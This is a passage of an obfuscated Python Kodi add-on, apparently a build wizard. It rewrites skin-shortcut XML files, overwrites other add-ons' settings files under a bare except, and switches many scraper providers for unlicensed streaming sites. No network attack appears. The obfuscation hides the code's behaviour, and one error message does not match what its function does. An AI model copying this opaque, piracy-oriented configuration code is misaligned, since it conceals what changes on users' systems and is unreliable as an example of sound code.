		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1199
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1202
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1203
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1207
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1208
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1209
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1227
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1230
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1231
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1235
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1236
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1237
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1255
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1258
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1259
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1263
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1264
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1265
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1283
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1286
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1287
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1290
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1291
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1292
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1310
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1313
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1314
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1316
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1317
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1318
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1336
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1339
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1340
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1342
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1343
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1344
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1362
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1365
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1366
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1369
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1370
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1371
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1389
    with open (O0OOOOOOOOOOOO0OO ,'w')as OO0O0OOO0OOOO0O0O :#line:1392
      OO0O0OOO0OOOO0O0O .write (O000O0000O00OOOOO )#line:1393
def rdbuildinstallON ():#line:1396
    try :#line:1398
       O0O0O00OO0OOO0OOO =ADDONPATH +"/resources/rd/victory.xml"#line:1399
       OO000O0OOOO00O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1400
       copyfile (O0O0O00OO0OOO0OOO ,OO000O0OOOO00O000 )#line:1402
       O0O0O00OO0OOO0OOO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1404
       OO000O0OOOO00O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1405
       copyfile (O0O0O00OO0OOO0OOO ,OO000O0OOOO00O000 )#line:1407
       O0O0O00OO0OOO0OOO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1409
       OO000O0OOOO00O000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1410
       copyfile (O0O0O00OO0OOO0OOO ,OO000O0OOOO00O000 )#line:1412
       O0O0O00OO0OOO0OOO =ADDONPATH +"/resources/rd/Splash.png"#line:1415
       OO000O0OOOO00O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1416
       copyfile (O0O0O00OO0OOO0OOO ,OO000O0OOOO00O000 )#line:1418
    except :#line:1420
       pass #line:1421
def rdbuild ():#line:1431
	O0OO0O0OOO00O0OOO =(ADDON .getSetting ("auto_rd"))#line:1432
	if O0OO0O0OOO00O0OOO =='true':#line:1433
		O00000O0O0OOO00O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1434
		O00000O0O0OOO00O0 .setSetting ('all_t','0')#line:1435
		O00000O0O0OOO00O0 .setSetting ('rd_menu_enable','false')#line:1436
		O00000O0O0OOO00O0 .setSetting ('magnet_bay','false')#line:1437
		O00000O0O0OOO00O0 .setSetting ('magnet_extra','false')#line:1438
		O00000O0O0OOO00O0 .setSetting ('rd_only','false')#line:1439
		O00000O0O0OOO00O0 .setSetting ('ftp','false')#line:1441
		O00000O0O0OOO00O0 .setSetting ('fp','false')#line:1442
		O00000O0O0OOO00O0 .setSetting ('filter_fp','false')#line:1443
		O00000O0O0OOO00O0 .setSetting ('fp_size_en','false')#line:1444
		O00000O0O0OOO00O0 .setSetting ('afdah','false')#line:1445
		O00000O0O0OOO00O0 .setSetting ('ap2s','false')#line:1446
		O00000O0O0OOO00O0 .setSetting ('cin','false')#line:1447
		O00000O0O0OOO00O0 .setSetting ('clv','false')#line:1448
		O00000O0O0OOO00O0 .setSetting ('cmv','false')#line:1449
		O00000O0O0OOO00O0 .setSetting ('dl20','false')#line:1450
		O00000O0O0OOO00O0 .setSetting ('esc','false')#line:1451
		O00000O0O0OOO00O0 .setSetting ('extra','false')#line:1452
		O00000O0O0OOO00O0 .setSetting ('film','false')#line:1453
		O00000O0O0OOO00O0 .setSetting ('fre','false')#line:1454
		O00000O0O0OOO00O0 .setSetting ('fxy','false')#line:1455
		O00000O0O0OOO00O0 .setSetting ('genv','false')#line:1456
		O00000O0O0OOO00O0 .setSetting ('getgo','false')#line:1457
		O00000O0O0OOO00O0 .setSetting ('gold','false')#line:1458
		O00000O0O0OOO00O0 .setSetting ('gona','false')#line:1459
		O00000O0O0OOO00O0 .setSetting ('hdmm','false')#line:1460
		O00000O0O0OOO00O0 .setSetting ('hdt','false')#line:1461
		O00000O0O0OOO00O0 .setSetting ('icy','false')#line:1462
		O00000O0O0OOO00O0 .setSetting ('ind','false')#line:1463
		O00000O0O0OOO00O0 .setSetting ('iwi','false')#line:1464
		O00000O0O0OOO00O0 .setSetting ('jen_free','false')#line:1465
		O00000O0O0OOO00O0 .setSetting ('kiss','false')#line:1466
		O00000O0O0OOO00O0 .setSetting ('lavin','false')#line:1467
		O00000O0O0OOO00O0 .setSetting ('los','false')#line:1468
		O00000O0O0OOO00O0 .setSetting ('m4u','false')#line:1469
		O00000O0O0OOO00O0 .setSetting ('mesh','false')#line:1470
		O00000O0O0OOO00O0 .setSetting ('mf','false')#line:1471
		O00000O0O0OOO00O0 .setSetting ('mkvc','false')#line:1472
		O00000O0O0OOO00O0 .setSetting ('mjy','false')#line:1473
		O00000O0O0OOO00O0 .setSetting ('hdonline','false')#line:1474
		O00000O0O0OOO00O0 .setSetting ('moviex','false')#line:1475
		O00000O0O0OOO00O0 .setSetting ('mpr','false')#line:1476
		O00000O0O0OOO00O0 .setSetting ('mvg','false')#line:1477
		O00000O0O0OOO00O0 .setSetting ('mvl','false')#line:1478
		O00000O0O0OOO00O0 .setSetting ('mvs','false')#line:1479
		O00000O0O0OOO00O0 .setSetting ('myeg','false')#line:1480
		O00000O0O0OOO00O0 .setSetting ('ninja','false')#line:1481
		O00000O0O0OOO00O0 .setSetting ('odb','false')#line:1482
		O00000O0O0OOO00O0 .setSetting ('ophd','false')#line:1483
		O00000O0O0OOO00O0 .setSetting ('pks','false')#line:1484
		O00000O0O0OOO00O0 .setSetting ('prf','false')#line:1485
		O00000O0O0OOO00O0 .setSetting ('put18','false')#line:1486
		O00000O0O0OOO00O0 .setSetting ('req','false')#line:1487
		O00000O0O0OOO00O0 .setSetting ('rftv','false')#line:1488
		O00000O0O0OOO00O0 .setSetting ('rltv','false')#line:1489
		O00000O0O0OOO00O0 .setSetting ('sc','false')#line:1490
		O00000O0O0OOO00O0 .setSetting ('seehd','false')#line:1491
		O00000O0O0OOO00O0 .setSetting ('showbox','false')#line:1492
		O00000O0O0OOO00O0 .setSetting ('shuid','false')#line:1493
		O00000O0O0OOO00O0 .setSetting ('sil_gh','false')#line:1494
		O00000O0O0OOO00O0 .setSetting ('spv','false')#line:1495
		O00000O0O0OOO00O0 .setSetting ('subs','false')#line:1496
		O00000O0O0OOO00O0 .setSetting ('tvs','false')#line:1497
		O00000O0O0OOO00O0 .setSetting ('tw','false')#line:1498
		O00000O0O0OOO00O0 .setSetting ('upto','false')#line:1499
		O00000O0O0OOO00O0 .setSetting ('vel','false')#line:1500
		O00000O0O0OOO00O0 .setSetting ('vex','false')#line:1501
		O00000O0O0OOO00O0 .setSetting ('vidc','false')#line:1502
		O00000O0O0OOO00O0 .setSetting ('w4hd','false')#line:1503
		O00000O0O0OOO00O0 .setSetting ('wav','false')#line:1504
		O00000O0O0OOO00O0 .setSetting ('wf','false')#line:1505
		O00000O0O0OOO00O0 .setSetting ('wse','false')#line:1506
		O00000O0O0OOO00O0 .setSetting ('wss','false')#line:1507
		O00000O0O0OOO00O0 .setSetting ('wsse','false')#line:1508
		O00000O0O0OOO00O0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1509
		O00000O0O0OOO00O0 .setSetting ('debrid.only','true')#line:1510
		O00000O0O0OOO00O0 .setSetting ('hosts.captcha','false')#line:1511
		O00000O0O0OOO00O0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1512
		O00000O0O0OOO00O0 .setSetting ('provider.123moviehd','false')#line:1513
		O00000O0O0OOO00O0 .setSetting ('provider.300mbdownload','false')#line:1514
		O00000O0O0OOO00O0 .setSetting ('provider.alltube','false')#line:1515
		O00000O0O0OOO00O0 .setSetting ('provider.allucde','false')#line:1516
		O00000O0O0OOO00O0 .setSetting ('provider.animebase','false')#line:1517
		O00000O0O0OOO00O0 .setSetting ('provider.animeloads','false')#line:1518
		O00000O0O0OOO00O0 .setSetting ('provider.animetoon','false')#line:1519
		O00000O0O0OOO00O0 .setSetting ('provider.bnwmovies','false')#line:1520
		O00000O0O0OOO00O0 .setSetting ('provider.boxfilm','false')#line:1521
		O00000O0O0OOO00O0 .setSetting ('provider.bs','false')#line:1522
		O00000O0O0OOO00O0 .setSetting ('provider.cartoonhd','false')#line:1523
		O00000O0O0OOO00O0 .setSetting ('provider.cdahd','false')#line:1524
		O00000O0O0OOO00O0 .setSetting ('provider.cdax','false')#line:1525
		O00000O0O0OOO00O0 .setSetting ('provider.cine','false')#line:1526
		O00000O0O0OOO00O0 .setSetting ('provider.cinenator','false')#line:1527
		O00000O0O0OOO00O0 .setSetting ('provider.cmovieshdbz','false')#line:1528
		O00000O0O0OOO00O0 .setSetting ('provider.coolmoviezone','false')#line:1529
		O00000O0O0OOO00O0 .setSetting ('provider.ddl','false')#line:1530
		O00000O0O0OOO00O0 .setSetting ('provider.deepmovie','false')#line:1531
		O00000O0O0OOO00O0 .setSetting ('provider.ekinomaniak','false')#line:1532
		O00000O0O0OOO00O0 .setSetting ('provider.ekinotv','false')#line:1533
		O00000O0O0OOO00O0 .setSetting ('provider.filiser','false')#line:1534
		O00000O0O0OOO00O0 .setSetting ('provider.filmpalast','false')#line:1535
		O00000O0O0OOO00O0 .setSetting ('provider.filmwebbooster','false')#line:1536
		O00000O0O0OOO00O0 .setSetting ('provider.filmxy','false')#line:1537
		O00000O0O0OOO00O0 .setSetting ('provider.fmovies','false')#line:1538
		O00000O0O0OOO00O0 .setSetting ('provider.foxx','false')#line:1539
		O00000O0O0OOO00O0 .setSetting ('provider.freefmovies','false')#line:1540
		O00000O0O0OOO00O0 .setSetting ('provider.freeputlocker','false')#line:1541
		O00000O0O0OOO00O0 .setSetting ('provider.furk','false')#line:1542
		O00000O0O0OOO00O0 .setSetting ('provider.gamatotv','false')#line:1543
		O00000O0O0OOO00O0 .setSetting ('provider.gogoanime','false')#line:1544
		O00000O0O0OOO00O0 .setSetting ('provider.gowatchseries','false')#line:1545
		O00000O0O0OOO00O0 .setSetting ('provider.hackimdb','false')#line:1546
		O00000O0O0OOO00O0 .setSetting ('provider.hdfilme','false')#line:1547
		O00000O0O0OOO00O0 .setSetting ('provider.hdmto','false')#line:1548
		O00000O0O0OOO00O0 .setSetting ('provider.hdpopcorns','false')#line:1549
		O00000O0O0OOO00O0 .setSetting ('provider.hdstreams','false')#line:1550
		O00000O0O0OOO00O0 .setSetting ('provider.horrorkino','false')#line:1552
		O00000O0O0OOO00O0 .setSetting ('provider.iitv','false')#line:1553
		O00000O0O0OOO00O0 .setSetting ('provider.iload','false')#line:1554
		O00000O0O0OOO00O0 .setSetting ('provider.iwaatch','false')#line:1555
		O00000O0O0OOO00O0 .setSetting ('provider.kinodogs','false')#line:1556
		O00000O0O0OOO00O0 .setSetting ('provider.kinoking','false')#line:1557
		O00000O0O0OOO00O0 .setSetting ('provider.kinow','false')#line:1558
		O00000O0O0OOO00O0 .setSetting ('provider.kinox','false')#line:1559
		O00000O0O0OOO00O0 .setSetting ('provider.lichtspielhaus','false')#line:1560
		O00000O0O0OOO00O0 .setSetting ('provider.liomenoi','false')#line:1561
		O00000O0O0OOO00O0 .setSetting ('provider.magnetdl','false')#line:1564
		O00000O0O0OOO00O0 .setSetting ('provider.megapelistv','false')#line:1565
		O00000O0O0OOO00O0 .setSetting ('provider.movie2k-ac','false')#line:1566
		O00000O0O0OOO00O0 .setSetting ('provider.movie2k-ag','false')#line:1567
		O00000O0O0OOO00O0 .setSetting ('provider.movie2z','false')#line:1568
		O00000O0O0OOO00O0 .setSetting ('provider.movie4k','false')#line:1569
		O00000O0O0OOO00O0 .setSetting ('provider.movie4kis','false')#line:1570
		O00000O0O0OOO00O0 .setSetting ('provider.movieneo','false')#line:1571
		O00000O0O0OOO00O0 .setSetting ('provider.moviesever','false')#line:1572
		O00000O0O0OOO00O0 .setSetting ('provider.movietown','false')#line:1573
		O00000O0O0OOO00O0 .setSetting ('provider.mvrls','false')#line:1575
		O00000O0O0OOO00O0 .setSetting ('provider.netzkino','false')#line:1576
		O00000O0O0OOO00O0 .setSetting ('provider.odb','false')#line:1577
		O00000O0O0OOO00O0 .setSetting ('provider.openkatalog','false')#line:1578
		O00000O0O0OOO00O0 .setSetting ('provider.ororo','false')#line:1579
		O00000O0O0OOO00O0 .setSetting ('provider.paczamy','false')#line:1580
		O00000O0O0OOO00O0 .setSetting ('provider.peliculasdk','false')#line:1581
		O00000O0O0OOO00O0 .setSetting ('provider.pelisplustv','false')#line:1582
		O00000O0O0OOO00O0 .setSetting ('provider.pepecine','false')#line:1583
		O00000O0O0OOO00O0 .setSetting ('provider.primewire','false')#line:1584
		O00000O0O0OOO00O0 .setSetting ('provider.projectfreetv','false')#line:1585
		O00000O0O0OOO00O0 .setSetting ('provider.proxer','false')#line:1586
		O00000O0O0OOO00O0 .setSetting ('provider.pureanime','false')#line:1587
		O00000O0O0OOO00O0 .setSetting ('provider.putlocker','false')#line:1588
		O00000O0O0OOO00O0 .setSetting ('provider.putlockerfree','false')#line:1589
		O00000O0O0OOO00O0 .setSetting ('provider.reddit','false')#line:1590
		O00000O0O0OOO00O0 .setSetting ('provider.cartoonwire','false')#line:1591
		O00000O0O0OOO00O0 .setSetting ('provider.seehd','false')#line:1592
		O00000O0O0OOO00O0 .setSetting ('provider.segos','false')#line:1593
		O00000O0O0OOO00O0 .setSetting ('provider.serienstream','false')#line:1594
		O00000O0O0OOO00O0 .setSetting ('provider.series9','false')#line:1595
		O00000O0O0OOO00O0 .setSetting ('provider.seriesever','false')#line:1596
		O00000O0O0OOO00O0 .setSetting ('provider.seriesonline','false')#line:1597
		O00000O0O0OOO00O0 .setSetting ('provider.seriespapaya','false')#line:1598
		O00000O0O0OOO00O0 .setSetting ('provider.sezonlukdizi','false')#line:1599
		O00000O0O0OOO00O0 .setSetting ('provider.solarmovie','false')#line:1600
		O00000O0O0OOO00O0 .setSetting ('provider.solarmoviez','false')#line:1601
		O00000O0O0OOO00O0 .setSetting ('provider.stream-to','false')#line:1602
		O00000O0O0OOO00O0 .setSetting ('provider.streamdream','false')#line:1603
		O00000O0O0OOO00O0 .setSetting ('provider.streamflix','false')#line:1604
		O00000O0O0OOO00O0 .setSetting ('provider.streamit','false')#line:1605
		O00000O0O0OOO00O0 .setSetting ('provider.swatchseries','false')#line:1606
		O00000O0O0OOO00O0 .setSetting ('provider.szukajkatv','false')#line:1607
		O00000O0O0OOO00O0 .setSetting ('provider.tainiesonline','false')#line:1608
		O00000O0O0OOO00O0 .setSetting ('provider.tainiomania','false')#line:1609
		O00000O0O0OOO00O0 .setSetting ('provider.tata','false')#line:1612
		O00000O0O0OOO00O0 .setSetting ('provider.trt','false')#line:1613
		O00000O0O0OOO00O0 .setSetting ('provider.tvbox','false')#line:1614
		O00000O0O0OOO00O0 .setSetting ('provider.ultrahd','false')#line:1615
		O00000O0O0OOO00O0 .setSetting ('provider.video4k','false')#line:1616
		O00000O0O0OOO00O0 .setSetting ('provider.vidics','false')#line:1617
		O00000O0O0OOO00O0 .setSetting ('provider.view4u','false')#line:1618
		O00000O0O0OOO00O0 .setSetting ('provider.watchseries','false')#line:1619
		O00000O0O0OOO00O0 .setSetting ('provider.xrysoi','false')#line:1620
		O00000O0O0OOO00O0 .setSetting ('provider.library','false')#line:1621
def fixfont ():#line:1624
	O0000O0O000O000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1625
	OOO00OOOO0OO00OOO =json .loads (O0000O0O000O000O0 );#line:1627
	O00O0OOOOOO00O000 =OOO00OOOO0OO00OOO ["result"]["settings"]#line:1628
	OO00OOO0OOOOO0O00 =[O0OOO00O00OOOOOOO for O0OOO00O00OOOOOOO in O00O0OOOOOO00O000 if O0OOO00O00OOOOOOO ["id"]=="audiooutput.audiodevice"][0 ]#line:1630
	O0OO0O00000O000OO =OO00OOO0OOOOO0O00 ["options"];#line:1631
	OO00000OOO00O0O0O =OO00OOO0OOOOO0O00 ["value"];#line:1632
	O000O0000O000O0O0 =[O0OOO0O00OO0OOOO0 for (O0OOO0O00OO0OOOO0 ,OOOOOOOOO000OO0O0 )in enumerate (O0OO0O00000O000OO )if OOOOOOOOO000OO0O0 ["value"]==OO00000OOO00O0O0O ][0 ];#line:1634
	OOOO0O0OOO000OO0O =(O000O0000O000O0O0 +1 )%len (O0OO0O00000O000OO )#line:1636
	O000O00OOOO0O00OO =O0OO0O00000O000OO [OOOO0O0OOO000OO0O ]["value"]#line:1638
	O00O00OO0OOO00O00 =O0OO0O00000O000OO [OOOO0O0OOO000OO0O ]["label"]#line:1639
	O0OO00O0O0O00OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1641
	try :#line:1643
		O0O00OO0O0O00OO00 =json .loads (O0OO00O0O0O00OOO0 );#line:1644
		if O0O00OO0O0O00OO00 ["result"]!=True :#line:1646
			raise Exception #line:1647
	except :#line:1648
		sys .stderr .write ("Error switching audio output device")#line:1649
		raise Exception #line:1650
def parseDOM2 (O000000OOOOO000O0 ,name =u"",attrs ={},ret =False ):#line:1651
	if isinstance (O000000OOOOO000O0 ,str ):#line:1654
		try :#line:1655
			O000000OOOOO000O0 =[O000000OOOOO000O0 .decode ("utf-8")]#line:1656
		except :#line:1657
			O000000OOOOO000O0 =[O000000OOOOO000O0 ]#line:1658
	elif isinstance (O000000OOOOO000O0 ,unicode ):#line:1659
		O000000OOOOO000O0 =[O000000OOOOO000O0 ]#line:1660
	elif not isinstance (O000000OOOOO000O0 ,list ):#line:1661
		return u""#line:1662
	if not name .strip ():#line:1664
		return u""#line:1665
	O000O0O0000O00O00 =[]#line:1667
	for OO00O0O0OOOO0O0O0 in O000000OOOOO000O0 :#line:1668
		O00OOO0O0OOO00000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO00O0O0OOOO0O0O0 )#line:1669
		for OOOOOOO0OO000000O in O00OOO0O0OOO00000 :#line:1670
			OO00O0O0OOOO0O0O0 =OO00O0O0OOOO0O0O0 .replace (OOOOOOO0OO000000O ,OOOOOOO0OO000000O .replace ("\n"," "))#line:1671
		O0OOO00O0O00OO0OO =[]#line:1673
		for O00OO00O00OOOO00O in attrs :#line:1674
			O00000OO0OOOOO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+O00OO00O00OOOO00O +'=[\'"]'+attrs [O00OO00O00OOOO00O ]+'[\'"].*?>))',re .M |re .S ).findall (OO00O0O0OOOO0O0O0 )#line:1675
			if len (O00000OO0OOOOO0O0 )==0 and attrs [O00OO00O00OOOO00O ].find (" ")==-1 :#line:1676
				O00000OO0OOOOO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+O00OO00O00OOOO00O +'='+attrs [O00OO00O00OOOO00O ]+'.*?>))',re .M |re .S ).findall (OO00O0O0OOOO0O0O0 )#line:1677
			if len (O0OOO00O0O00OO0OO )==0 :#line:1679
				O0OOO00O0O00OO0OO =O00000OO0OOOOO0O0 #line:1680
				O00000OO0OOOOO0O0 =[]#line:1681
			else :#line:1682
				OOOO0OOO00O0O00O0 =range (len (O0OOO00O0O00OO0OO ))#line:1683
				OOOO0OOO00O0O00O0 .reverse ()#line:1684
				for OOO0O00OO0OOOOO00 in OOOO0OOO00O0O00O0 :#line:1685
					if not O0OOO00O0O00OO0OO [OOO0O00OO0OOOOO00 ]in O00000OO0OOOOO0O0 :#line:1686
						del (O0OOO00O0O00OO0OO [OOO0O00OO0OOOOO00 ])#line:1687
		if len (O0OOO00O0O00OO0OO )==0 and attrs =={}:#line:1689
			O0OOO00O0O00OO0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO00O0O0OOOO0O0O0 )#line:1690
			if len (O0OOO00O0O00OO0OO )==0 :#line:1691
				O0OOO00O0O00OO0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO00O0O0OOOO0O0O0 )#line:1692
		if isinstance (ret ,str ):#line:1694
			O00000OO0OOOOO0O0 =[]#line:1695
			for OOOOOOO0OO000000O in O0OOO00O0O00OO0OO :#line:1696
				O0000O0OOO0O00000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOOOO0OO000000O )#line:1697
				if len (O0000O0OOO0O00000 )==0 :#line:1698
					O0000O0OOO0O00000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOOOO0OO000000O )#line:1699
				for OO000OOO00O0000O0 in O0000O0OOO0O00000 :#line:1700
					O00O000000O0OO0OO =OO000OOO00O0000O0 [0 ]#line:1701
					if O00O000000O0OO0OO in "'\"":#line:1702
						if OO000OOO00O0000O0 .find ('='+O00O000000O0OO0OO ,OO000OOO00O0000O0 .find (O00O000000O0OO0OO ,1 ))>-1 :#line:1703
							OO000OOO00O0000O0 =OO000OOO00O0000O0 [:OO000OOO00O0000O0 .find ('='+O00O000000O0OO0OO ,OO000OOO00O0000O0 .find (O00O000000O0OO0OO ,1 ))]#line:1704
